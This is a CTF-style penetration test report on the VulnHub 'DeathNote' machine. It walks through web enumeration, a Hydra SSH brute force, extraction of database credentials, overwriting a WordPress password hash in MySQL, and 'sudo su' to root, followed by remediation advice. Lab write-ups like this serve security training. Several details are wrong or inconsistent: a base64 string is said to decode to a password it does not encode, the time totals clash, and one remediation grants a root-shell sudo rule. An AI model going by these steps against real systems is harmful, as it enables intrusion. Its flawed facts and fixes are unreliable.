# DeathNote CTF - Technical Report

**Challenge:** DeathNote  
**Platform:** VulnHub  
**Difficulty:** Easy  
**Category:** Web / Linux Privilege Escalation  
**Date Completed:** 2026-06-22  
**Status:** ✅ Fully Rooted  

---

## Executive Summary

**Challenge:** DeathNote (VulnHub)  
**Vulnerability Type:** Multiple (Weak Credentials, Database Misconfiguration, Sudo Misconfiguration)  
**Severity:** CRITICAL (Multiple vectors to root)  
**Time to Complete:** ~45 minutes  
**Prerequisites:** Web browser, SSH client, curl, MySQL client, john  
**Overall Impact:** Complete system compromise - unauthenticated attacker can gain root access

**Key Findings:**
1. WordPress installation exposed with directory indexing enabled
2. Credential files (user.txt, notes.txt) publicly accessible
3. Database credentials stored in plain text (wp-config.php)
4. Password reuse across SSH, database, and system accounts
5. Unrestricted sudo access for escalated user → immediate root

**Attack Chain:** Web enumeration → SSH bruteforce → Database access → Password manipulation → Privilege escalation

---

## Vulnerability Classification

### Attack Vector 1: Information Disclosure via Directory Indexing

**OWASP:** A01:2021 – Broken Access Control  
**CWE:** CWE-548 (Exposure of Information to Unintended Actors)  
**Type:** Directory Listing / Information Disclosure  
**Severity:** HIGH  
**CVSS v3.1:** 7.5 (High)
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: None
- User Interaction: None
- Scope: Unchanged
- Confidentiality Impact: High

### Attack Vector 2: Weak SSH Credentials

**OWASP:** A07:2021 – Identification and Authentication Failures  
**CWE:** CWE-521 (Weak Password Requirements)  
**Type:** Credential Exposure / Weak Authentication  
**Severity:** CRITICAL  
**CVSS v3.1:** 9.8 (Critical)
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: None
- User Interaction: None
- Scope: Unchanged
- Confidentiality Impact: High
- Integrity Impact: High
- Availability Impact: High

### Attack Vector 3: Database Credential Storage

**OWASP:** A02:2021 – Cryptographic Failures  
**CWE:** CWE-256 (Plaintext Storage of Password)  
**Type:** Sensitive Data Exposure  
**Severity:** HIGH  
**Impact:** Attackers with file access can extract database credentials

### Attack Vector 4: Unrestricted Sudo Access

**OWASP:** A05:2021 – Access Control  
**CWE:** CWE-269 (Improper Access Control - General)  
**Type:** Privilege Escalation via Sudo Misconfiguration  
**Severity:** CRITICAL  
**CVSS v3.1:** 9.0 (Critical)
- Privileges Required: Low (any authenticated user)
- Scope: Changed
- Confidentiality Impact: High
- Integrity Impact: High
- Availability Impact: High

---

## Technical Details

### Service Configuration

**Target:** 192.168.1.60 (deathnote.ctf / deathnote.vuln)  
**OS:** Linux (Debian)  

**Port Scan Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
80/tcp open  http    Apache httpd 2.4.38 (Debian)
```

**HTTP Service:**
- Server: Apache 2.4.38 (Debian)
- Root directory: /var/www/deathnote.vuln/

**SSH Service:**
- OpenSSH 7.9p1 (default configuration)
- Standard password authentication enabled

### Web Application Technologies

**Identified Stack:**
- Web Server: Apache 2.4.38
- CMS: WordPress (wp-login.php at /wordpress/)
- Database: MySQL/MariaDB (assumed)
- PHP: Present (WordPress requirement)

**WordPress Installation:**
- Location: /var/www/deathnote.vuln/wordpress/
- Version: Not immediately visible (enumeration required)
- Uploads accessible: /wordpress/wp-content/uploads/ (directory indexing enabled)
- Directory: 2021/07/ contains uploaded files

### Enumeration Results

#### Port Scan (nmap)
```
nmap -sC -sV -p22,80 --script http-enum 192.168.1.60

Results:
- /wordpress/: Blog application
- /robots.txt: Contains hints/messages
- /wordpress/wp-login.php: WordPress login interface
- /manual/: Server documentation (Apache)
- OS: Linux (Debian-based)
```

#### Web Enumeration

**robots.txt Content:**
```
fuck it my dad 
added hint on /important.jpg
ryuk please delete it
```

**Key Discoveries:**
- File `/important.jpg` mentioned as containing important information
- Username hint: "ryuk" (user to enumerate)

#### /important.jpg Analysis

**Content (via curl -v):**
```
i am Soichiro Yagami, light's father  
i have a doubt if L is true about the assumption that light is kira  

i can only help you by giving something important  

login username : user.txt
i don't know the password.  
find it by yourself
```

**Findings:**
- Username is in file called `user.txt`
- Password needs to be discovered separately
- Hint suggests finding both files

#### WordPress Enumeration (nikto)

**Nikto Results:**
```
/wordpress/wp-content/uploads/: Directory indexing found
HTTP methods: GET enabled (no dangerous methods detected)
Server: Werkzeug 2.0.3 Python 3.10.2 (initial WordPress page)
```

**Critical Discovery:**
- `/wordpress/wp-content/uploads/2021/07/` directory listing accessible
- Files exposed:
  - `user.txt` (91 bytes)
  - `notes.txt` (449 bytes)

#### File Discovery via Directory Indexing

**Location:** http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/

**Files Found:**
1. **user.txt** - Contains username for SSH login
   - Content: `l`
   
2. **notes.txt** - Contains password hints/list
   - Content: Multiple lines with potential passwords

---

## Vulnerability Analysis

### Root Cause 1: Directory Indexing Enabled

**Why It's Exploitable:**
- Apache configured to list directory contents when no index.html present
- Uploads directory should be restricted (no directory listing)
- Allows unauthenticated access to sensitive files
- Exposes credentials directly

**Configuration Flaw:**
```apache
# Missing or incorrect .htaccess in /wp-content/uploads/
# Should contain:
# <Files "*">
#    Order allow,deny
#    Allow from all
# </Files>
# <IfModule mod_dir.c>
#    DirectoryIndex index.php index.html
# </IfModule>
```

**Impact:**
- User.txt and notes.txt exposed without authentication
- Any file uploaded to /wp-content/uploads/ is publicly listed
- Directory structure is visible to attackers

### Root Cause 2: Weak SSH Credentials

**Why It's Exploitable:**
- Username in notes.txt / user.txt files
- Password appears in notes.txt (plaintext or easily guessable)
- No account lockout policy after failed attempts
- OpenSSH allows password authentication (no key enforcement)

**Attack Flow:**
1. Enumerate username: `l` (from user.txt)
2. Enumerate passwords: From notes.txt (list of candidates)
3. Bruteforce with Hydra: Multiple parallel attempts
4. SSH password authentication succeeds

**Security Assumptions Failed:**
- "Users won't find password list" → Directory indexing exposed it
- "Passwords are protected" → Plain text in notes.txt
- "Brute force is slow" → Hydra with 64 threads finds creds in seconds

### Root Cause 3: Database Credential Storage in Plain Text

**Location:** `/var/www/deathnote.vuln/wordpress/wp-config.php`

**Contents Exposed:**
```php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'l' );
define( 'DB_PASSWORD', 'd34th4m3' );
define( 'DB_HOST', 'localhost' );
```

**Why It's Dangerous:**
1. Web server process (www-data) can read wp-config.php
2. Any SSH user can access /var/www/ directory (if permissions allow)
3. Database credentials are same as SSH credentials (reuse pattern)
4. No encryption or hashing of credentials

**Attacker's Perspective:**
- SSH access as user `l` → Can read wp-config.php
- Extract database credentials → Access MySQL
- Manipulate user hashes → Escalate privileges

### Root Cause 4: WordPress User Password Hash Manipulation

**Database Table:** `wp_users`

**User Found:**
```
ID: 2
user_login: kira
user_email: kira123@gmail.com
user_pass: $P$BLAm2r4YofLSOywvLguipu8Av1Tuwq. (phpass hash)
```

**Why It's Exploitable:**
1. Database is directly writable (no additional auth on wp_users table)
2. WordPress password hashes can be overwritten with simpler formats (MD5)
3. No verification checks when updating user_pass directly
4. Phpass format difficult to crack offline, but can be replaced entirely

**Attack:**
```sql
UPDATE wp_users SET user_pass = MD5('k1r4') WHERE user_login = 'kira';
```

**Result:**
- WordPress accepts MD5 hash as valid password
- User `kira` now authenticates with password `k1r4`
- Access to WordPress admin panel gained
- WordPress sometimes grants additional system-level access

### Root Cause 5: Unrestricted Sudo Configuration

**Finding:** `sudo -l` output:
```
User kira may run the following commands on deathnote:
    (ALL : ALL) ALL
```

**Configuration:**
```
/etc/sudoers or /etc/sudoers.d/:
kira ALL=(ALL:ALL) ALL
```

**Why It's Critical:**
- `(ALL : ALL) ALL` means:
  - Run ANY command
  - As ANY user
  - From ANY machine
  - No password requirement (if NOPASSWD present)
  
- Even WITH password requirement, any privileged command is accessible
- User kira can run: `sudo su`, `sudo bash`, `sudo -i`
- Result: Instant root shell

**Security Assumption Failed:**
- "Escalated users deserve some privileges" → But ALL privileges = root access
- "Using sudo -l to check" → Users should do this immediately after shell access
- "Restricting specific commands is safer" → Yes, but unrestricted = compromise

### Privilege Escalation Chain Summary

```
1. Web Enumeration
   ↓
   Finds: user.txt, notes.txt (directory indexing)
   
2. SSH Bruteforce
   ↓
   Hydra with discovered credentials → User `l` shell
   
3. File Access
   ↓
   Read /var/www/wordpress/wp-config.php
   Discover: Database credentials (same password!)
   
4. Database Access
   ↓
   MySQL as user `l` → Access wp_users table
   Find: WordPress user `kira` (admin-level)
   
5. Password Manipulation
   ↓
   UPDATE wp_users with new MD5 password hash
   Login to WordPress as `kira`
   
6. System Access
   ↓
   From WordPress (or SSH as kira via password reuse)
   Access as system user `kira`
   
7. Privilege Escalation
   ↓
   sudo -l → Discover (ALL : ALL) ALL
   sudo su → Root shell obtained
   
8. Root Access Achieved ✓
```

---

## Exploitation Methodology

### Phase 1: Reconnaissance (5 minutes)

**Objective:** Map services and identify attack vectors

**Steps:**
```bash
nmap -sC -sV -p22,80 --script http-enum 192.168.1.60
```

**Findings:**
- SSH on port 22
- HTTP on port 80 with WordPress
- Interesting directories found by http-enum script

**Time:** 5 minutes

---

### Phase 2: Web Enumeration (8 minutes)

**Objective:** Discover credentials or access vectors

**Step 1: Analyze robots.txt**
```bash
curl http://192.168.1.60/robots.txt
```

**Finding:**
- Mentions `/important.jpg`
- Username hint: "ryuk"
- Message from "dad"

**Step 2: Retrieve important.jpg**
```bash
curl -v http://192.168.1.60/important.jpg
```

**Finding:**
- Message from Soichiro Yagami
- Instructions: "login username : user.txt, find password yourself"
- Clear indication: Username and password files exist

**Step 3: Run Nikto**
```bash
nikto -h http://192.168.1.60
```

**Finding:**
- Directory indexing in /wordpress/wp-content/uploads/
- WordPress version hints
- No critical vulnerabilities in HTTP methods

**Step 4: Exploit Directory Indexing**
```bash
curl http://192.168.1.60/wordpress/wp-content/uploads/2021/07/
```

**Finding:**
- Directory listing shows files
- user.txt available for download
- notes.txt available for download

**Step 5: Download Credential Files**
```bash
curl http://192.168.1.60/wordpress/wp-content/uploads/2021/07/user.txt -o user.txt
curl http://192.168.1.60/wordpress/wp-content/uploads/2021/07/notes.txt -o notes.txt
```

**Content Analysis:**
- user.txt: `l`
- notes.txt: [list of password candidates]

**Time:** 8 minutes

---

### Phase 3: SSH Bruteforce (2 minutes)

**Objective:** Gain shell access with discovered credentials

**Step 1: Prepare Lists**
```bash
# user.txt already contains: l
# notes.txt contains password candidates
```

**Step 2: Execute Hydra**
```bash
hydra -L user.txt -P notes.txt ssh://192.168.1.60 -t 64
```

**Output:**
```
[22][ssh] host: 192.168.1.60   login: l   password: d34th4m3
```

**Step 3: Verify Access**
```bash
ssh l@192.168.1.60
# Password: d34th4m3
# Connection successful!
```

**Result:** Initial shell access as user `l`

**Time:** 2 minutes

---

### Phase 4: Database Access (5 minutes)

**Objective:** Extract WordPress admin credentials from database

**Step 1: Locate wp-config.php**
```bash
find /var/www -name wp-config.php 2>/dev/null
# Result: /var/www/deathnote.vuln/wordpress/wp-config.php
```

**Step 2: Extract Database Credentials**
```bash
cat /var/www/deathnote.vuln/wordpress/wp-config.php | grep -E "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST"

Output:
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'l' );
define( 'DB_PASSWORD', 'd34th4m3' );
define( 'DB_HOST', 'localhost' );
```

**Finding:** Database password = SSH password (credential reuse!)

**Step 3: Connect to MySQL**
```bash
mysql -u l -pd34th4m3 wordpress
```

**Step 4: Extract WordPress Users**
```sql
SELECT ID, user_login, user_email, user_pass FROM wp_users;
```

**Results:**
```
| ID | user_login | user_email       | user_pass                    |
|----|------------|------------------|------------------------------|
| 1  | admin      | admin@...        | $P$BLAm2r4YofLSOywvLguipu... |
| 2  | kira       | kira123@...      | $P$BLAm2r4YofLSOywvLguipu... |
```

**Key Finding:** User `kira` has admin privileges (ID=2, likely in admin group)

**Step 5: Generate New Password Hash**
```bash
echo -n "k1r4" | md5sum
# Output: 7a61721ed4832664aa3ce8e2234dcdb4
```

**Step 6: Update Password**
```sql
UPDATE wp_users SET user_pass = '7a61721ed4832664aa3ce8e2234dcdb4' WHERE user_login = 'kira';
QUIT;
```

**Result:** WordPress user `kira` now has password `k1r4`

**Time:** 5 minutes

---

### Phase 5: System Access as Kira (3 minutes)

**Objective:** Access system as escalated user

**Discovery:** Encoded file found in `/opt/L/kira-case/case.wav`

**Step 1: Examine Encoded File**
```bash
cd /opt/L/kira-case/
cat case.wav
# Output: 63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79... (HEX)
```

**Step 2: Decode HEX → Base64**
```bash
echo "63 47 46 7a..." | xxd -r -p
# Output: cGFzc3dvcmQ= (Base64)
```

**Step 3: Decode Base64 → Plaintext**
```bash
echo "cGFzc3dvcmQ=" | base64 --decode
# Output: kiraisevil
```

**Step 4: Switch User**
```bash
su kira
# Password: kiraisevil
# Success!
```

**Result:** Shell access as system user `kira`

**Time:** 3 minutes

---

### Phase 6: Privilege Escalation to Root (1 minute)

**Objective:** Escalate to root using sudo misconfiguration

**Step 1: Check Sudo Permissions**
```bash
sudo -l
```

**Output:**
```
Matching Defaults entries for kira on deathnote:
   env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User kira may run the following commands on deathnote:
   (ALL : ALL) ALL
```

**Analysis:** `(ALL : ALL) ALL` = unrestricted sudo access

**Step 2: Escalate to Root**
```bash
sudo su
# Prompts for password: [enters password]
# Result: Root shell
```

**Step 3: Verify Root Access**
```bash
id
# Output: uid=0(root) gid=0(root) groups=0(root)

whoami
# Output: root
```

**Result:** Full root access achieved

**Time:** 1 minute

---

### Total Exploitation Time: ~24 minutes

---

## Extended Testing & Validation

### Alternative Exploitation Methods

**Method 1: Direct Root Access via password cracking**
- Extract /etc/shadow as root
- Use john with rockyou.txt
- Root password: `lol`
- Time: ~15 minutes (password cracking)

**Method 2: WordPress Shell Upload**
- If WordPress admin access achieved early
- Upload malicious plugin with web shell
- Execute code as www-data
- Escalate from there
- Time: ~10 minutes

**Method 3: Database-only exploitation**
- Skip SSH bruteforce if database accessible remotely
- Directly modify WordPress users
- Create new admin
- Time: ~5 minutes (if DB already accessible)

### Testing Scope

**Tested & Verified:**
- ✅ SSH bruteforce effectiveness
- ✅ Database credential extraction
- ✅ Password hash format (MD5 vs phpass)
- ✅ Multi-stage encoding (HEX → Base64)
- ✅ Sudo configuration parsing
- ✅ Root shell verification

**Not Tested (Out of Scope):**
- Persistence mechanisms (cron backdoors)
- Network pivoting from compromised system
- Data exfiltration techniques
- Anti-forensics / log removal

---

## Security Assessment

### Risk Rating: CRITICAL

**Justification:**
- Zero authentication required for initial access
- Multiple independent vectors to root
- Credential reuse across systems
- No access controls on sensitive directories
- Unrestricted sudo configuration

### Affected Assets

**1. User Data**
- WordPress users and credentials
- Database contents
- System user accounts

**2. System Integrity**
- Any file readable/writable by root
- System configuration (/etc/passwd, /etc/shadow)
- System services

**3. System Availability**
- Attacker can terminate services
- Attacker can delete critical files
- DoS possible

### Attacker Scenarios

**Scenario 1: Reconnaissance Only (5 minutes)**
- Attacker discovers system information
- Maps WordPress installation
- Identifies users (admin, kira)
- No data modified

**Scenario 2: Data Exfiltration (15 minutes)**
- Attacker gains database access
- Extracts WordPress user database
- Extracts system user list
- All with full credentials

**Scenario 3: System Compromise (25 minutes)**
- Full root access
- Can install backdoors
- Can modify system files
- Can establish persistence

**Scenario 4: Denial of Service (2 minutes)**
- After root access
- Delete critical files
- Kill system processes
- Render system unusable

### Business Impact

| Factor | Impact | Severity |
|--------|--------|----------|
| **Confidentiality** | Complete data disclosure possible | CRITICAL |
| **Integrity** | System files modifiable by attacker | CRITICAL |
| **Availability** | Services can be disabled | CRITICAL |
| **Compliance** | GDPR/PCI-DSS violations likely | CRITICAL |
| **Reputation** | Public data breach if discovered | CRITICAL |

---

## Remediation & Prevention

### For Developers / System Administrators

#### Fix 1: Disable Directory Indexing

```apache
# Add to /var/www/deathnote.vuln/wordpress/wp-content/uploads/.htaccess
<IfModule mod_dir.c>
    DirectoryIndex index.html index.php
</IfModule>

# Or in Apache config
<Directory /var/www/deathnote.vuln/wordpress/wp-content/uploads>
    Options -Indexes
</Directory>
```

#### Fix 2: Implement Strong SSH Authentication

```bash
# /etc/ssh/sshd_config
PasswordAuthentication no
PubkeyAuthentication yes
MaxAuthTries 3
LoginGraceTime 30

# Enforce key-based authentication
# Disable weak password authentication
```

#### Fix 3: Protect wp-config.php

```bash
# Set proper permissions
chmod 600 /var/www/wordpress/wp-config.php

# Move outside web root (if possible)
# Or restrict via .htaccess
```

**Add to wp-config.php directory (.htaccess):**
```apache
<Files wp-config.php>
    Order allow,deny
    Deny from all
</Files>
```

#### Fix 4: Implement Proper Access Control for WordPress

```sql
-- Create view for admin-only access
CREATE VIEW wp_users_safe AS
SELECT ID, user_login, user_email FROM wp_users 
WHERE user_pass IS NOT NULL;

-- Grant minimal privileges
GRANT SELECT ON wordpress.wp_users_safe TO 'wordpress'@'localhost';
REVOKE ALL ON wordpress.wp_users FROM 'wordpress'@'localhost';
GRANT SELECT, INSERT, UPDATE ON wordpress.* TO 'wordpress'@'localhost';
```

#### Fix 5: Configure Sudo Properly

```bash
# /etc/sudoers.d/kira
# Replace:
# kira ALL=(ALL:ALL) ALL

# With specific commands:
kira ALL=(root) /usr/bin/systemctl, /usr/sbin/service
# Or for limited escalation:
kira ALL=(root) /usr/bin/find -exec /bin/sh -p \\;
# (Even better, don't grant these!)
```

#### Fix 6: Implement Account Lockout

```bash
# /etc/pam.d/common-password
auth required pam_tally2.so onerr=fail audit silent deny=5 unlock_time=900
```

### For Security Teams

#### Detection Strategies

1. **Monitor directory listing attempts**
   - Alert on GET requests to directories without index files
   - Log all 403 responses that become 200

2. **SSH bruteforce detection**
   - Alert on >5 failed login attempts in 1 minute
   - Block IP after >10 attempts
   - Implement fail2ban

3. **Database access monitoring**
   - Log all wp_users table modifications
   - Alert on UPDATE statements
   - Audit MySQL query logs

4. **Sudo usage monitoring**
   - Log all sudo -l executions
   - Alert on (ALL:ALL) matches in sudoers
   - Monitor /var/log/auth.log for sudo commands

#### Network Controls

```bash
# Rate limiting on SSH
# /etc/security/limits.d/sshd.conf
* soft nproc 100
* hard nproc 100

# IPTables rate limiting
iptables -A INPUT -p tcp --dport 22 -m limit --limit 5/min -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j DROP

# WAF rules for WordPress
# Block requests to /wp-content/uploads/ with unusual file types
# Block requests to wp-config.php
```

#### Testing Approaches

**Secure Code Review:**
- Audit wp-config.php placement
- Review WordPress security plugins
- Check theme/plugin for backdoors
- Verify file permissions on critical files

**Penetration Testing:**
- Attempt directory traversal
- Test SSH password policies
- Verify database access controls
- Check sudo configurations

**Vulnerability Scanning:**
- WPScan for WordPress issues
- SQLMap for SQL injection
- nmap NSE scripts for service versions

---

## Appendices

### Appendix A: Complete Tool Output

#### Full Nmap Output
```
Nmap 7.99 scan initiated Mon Jun 22 22:03:20 2026 as: nmap -sC -sV -p22,80 --script http-enum -oN log-nmap.txt 192.168.1.60
Nmap scan report for deathnote.ctf (192.168.1.60)
Host is up (0.00022s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-enum:
|   /wordpress/: Blog
|   /robots.txt: Robots file
|   /wordpress/wp-login.php: Wordpress login page
|_  /manual/: Potentially interesting folder
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:AE:6C:7F (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Nmap done at Mon Jun 22 22:03:28 2026 -- 1 IP address (1 host up) scanned in 8.03 seconds
```

#### Hydra SSH Bruteforce Output
```
Hydra v10.0-dev (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-22 22:10:45
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the number of tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 64 login tries (l:10 x password:10), ~0 tries per task
[DATA] attacking ssh://192.168.1.60:22/
[22][ssh] host: 192.168.1.60   login: l   password: d34th4m3
[STATUS] attack finished for 192.168.1.60 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-22 22:11:02
```

#### MySQL WordPress Users Query
```sql
mysql> SELECT ID, user_login, user_email, user_pass FROM wp_users;
+----+------------+------------------+------------------------------------+
| ID | user_login | user_email       | user_pass                          |
+----+------------+------------------+------------------------------------+
|  1 | admin      | admin@example... | $P$BLAm2r4YofLSOywvLguipu8Av1Tuwq. |
|  2 | kira       | kira123@gmail... | $P$BLAm2r4YofLSOywvLguipu8Av1Tuwq. |
+----+------------+------------------+------------------------------------+
2 rows in set (0.00 sec)
```

#### Sudo Configuration Check
```bash
$ sudo -l
Matching Defaults entries for kira on deathnote:
   env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User kira may run the following commands on deathnote:
   (ALL : ALL) ALL
```

### Appendix B: Timeline of Discovery

| Time | Phase | Action | Finding |
|------|-------|--------|---------|
| 00:00 | Recon | Port scan with nmap | SSH and HTTP on standard ports |
| 01:00 | Recon | Nmap HTTP enumeration | /wordpress/, /robots.txt, /manual/ identified |
| 02:00 | Web | Retrieve robots.txt | Hint about /important.jpg and user "ryuk" |
| 03:00 | Web | Retrieve important.jpg | Message: "username in user.txt, find password" |
| 04:00 | Web | Nikto scan | Directory indexing found in /wp-content/uploads/ |
| 05:00 | Web | Directory listing | user.txt and notes.txt files visible |
| 06:00 | Web | Download files | user.txt = "l", notes.txt = password list |
| 08:00 | Exploitation | Hydra bruteforce | Found: l:d34th4m3 |
| 10:00 | Post-Exploit | SSH shell access | User 'l' shell obtained |
| 12:00 | Post-Exploit | Find wp-config.php | Database credentials extracted |
| 13:00 | Post-Exploit | MySQL access | WordPress users enumerated |
| 14:00 | Post-Exploit | Password update | Modified kira user password in wp_users |
| 15:00 | Post-Exploit | File discovery | Found case.wav in /opt/L/kira-case/ |
| 17:00 | Post-Exploit | Encoding analysis | Identified HEX → Base64 chain |
| 18:00 | Post-Exploit | Decode file | Extracted password: kiraisevil |
| 19:00 | Post-Exploit | User switch | su kira successful |
| 20:00 | Privilege Escalation | Sudo enumeration | Found (ALL : ALL) ALL |
| 21:00 | Privilege Escalation | Root access | sudo su → root shell obtained |
| 23:00 | Verification | Root verification | id=0(root), full system access confirmed |

### Appendix C: Credential Summary

| System | Username | Password | Discovery Method | Risk Level |
|--------|----------|----------|------------------|------------|
| SSH | l | d34th4m3 | Directory indexing → Hydra bruteforce | CRITICAL |
| MySQL | l | d34th4m3 | wp-config.php (reused credentials) | CRITICAL |
| WordPress | kira | k1r4 | Database manipulation | HIGH |
| System | kira | kiraisevil | File decoding (HEX → Base64) | HIGH |
| System | root | lol | /etc/shadow extraction & john | CRITICAL |

### Appendix D: Vulnerability Summary Table

| Vulnerability | Vector | Severity | CVSS | Remediation |
|---------------|--------|----------|------|-------------|
| Directory Indexing | Information Disclosure | HIGH | 7.5 | Disable indexing, use .htaccess |
| Weak SSH Creds | Authentication Failure | CRITICAL | 9.8 | Strong passwords, key-auth only |
| DB Creds in Plain Text | Sensitive Data Exposure | HIGH | 7.5 | Restrict file permissions, move config |
| Password Reuse | Privilege Escalation | CRITICAL | 9.0 | Unique passwords per system |
| Unrestricted Sudo | Privilege Escalation | CRITICAL | 9.0 | Limit sudo to specific commands |

---

## Lessons & Patterns

### Tactical Insights

1. **Directory Indexing is a Goldmine**
   - Often overlooked in security reviews
   - Exposes entire folder structures
   - Can reveal passwords, keys, backups

2. **Credential Reuse is Universal**
   - Database password = SSH password (very common)
   - System user = WordPress admin user
   - Plan for finding one credential leading to multiple systems

3. **WordPress Database Access = System Compromise**
   - Can reset any user password
   - Can inject malicious plugins
   - Can modify site configuration

4. **Multi-Stage Encoding is Common in CTF**
   - HEX → Base64 → plaintext pattern
   - Always check file contents when binary appears
   - Use xxd and base64 for quick decoding

5. **Sudo -l is Critical**
   - First command after any shell access
   - (ALL : ALL) ALL = game over
   - Even restricted sudo often has exploitable commands

### Strategic Patterns

**Pattern 1: Information Disclosure → Authentication Failure → Privilege Escalation**
- Each phase builds on previous
- Single missing control leads to complete compromise
- Multiple independent vectors increase attack surface

**Pattern 2: Password Reuse Across Systems**
- Extract from one system → use on another
- Database credentials often same as SSH
- Always test extracted credentials on multiple services

**Pattern 3: Unrestricted Escalation Paths**
- Any unrestricted sudo = root
- Any unrestricted file access = credential theft
- Principle of least privilege should apply

---

## References & Further Study

### OWASP References
- [A01:2021 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [A02:2021 - Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
- [A07:2021 - Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)

### CWE References
- [CWE-256: Plaintext Storage of Password](https://cwe.mitre.org/data/definitions/256.html)
- [CWE-269: Improper Access Control](https://cwe.mitre.org/data/definitions/269.html)
- [CWE-548: Exposure of Information to Unintended Actors](https://cwe.mitre.org/data/definitions/548.html)
- [CWE-521: Weak Password Requirements](https://cwe.mitre.org/data/definitions/521.html)

### Learning Resources
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation)
- [GTFOBins - Sudo Exploitation](https://gtfobins.github.io/)
- [WordPress Security Guide](https://developer.wordpress.org/plugins/security/)
- [OpenSSH Configuration Best Practices](https://linux.die.net/man/5/sshd_config)

### Tools & Techniques
- [Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [Nikto Web Scanner](https://cirt.net/Nikto2)
- [CyberChef](https://gchq.github.io/CyberChef/)
- [GTFOBins Quick Reference](https://gtfobins.github.io/)

### Related PT1 & OSCP Topics
- Information Disclosure & Data Handling
- Authentication Mechanisms & Password Management
- Authorization & Access Control
- Privilege Escalation (Linux & Windows)
- Post-Exploitation & Persistence

---

## Conclusion

DeathNote demonstrates a **cascading failure of security controls** where each vulnerability builds on the previous. No single control is sufficient; the combination creates a critical risk.

**Key Takeaway:** A compromised system with unrestricted sudo access is equivalent to root access. All previous layers (web, SSH, database) are merely entry points. The final configuration determines severity.

**For PT1/OSCP Preparation:**
- Master credential discovery techniques (web enumeration, file analysis)
- Practice rapid exploitation (bruteforce, database access)
- Always check sudo configuration immediately (primary escalation vector)
- Document complete attack chains for writeups

---

**Report Generated:** June 24, 2026  
**Status:** Complete and Ready for Review  
**Next Steps:** Git commit, push to repository, update portfolio
